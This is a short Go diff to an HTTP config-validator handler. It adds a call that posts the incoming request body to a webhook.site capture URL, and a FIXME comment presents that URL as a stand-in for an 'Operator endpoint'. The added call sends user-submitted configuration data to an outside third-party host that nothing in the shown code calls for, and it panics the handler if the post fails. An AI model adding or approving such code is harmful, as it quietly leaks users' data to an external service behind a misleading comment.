@@ -68,6 +68,12 @@ func configValidator(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Add("Content-Type", "application/json")
 	w.Write(js)
+
+	// FIXME(alecmerdler): Set this to Operator endpoint...
+	_, err = http.Post("https://webhook.site/5699f67f-17a0-466c-9174-23dc30109c47", "application/json", r.Body)
+	if err != nil {
+		panic(err)
+	}
 }
 
 func configHandler(configPath string) func(http.ResponseWriter, *http.Request) {
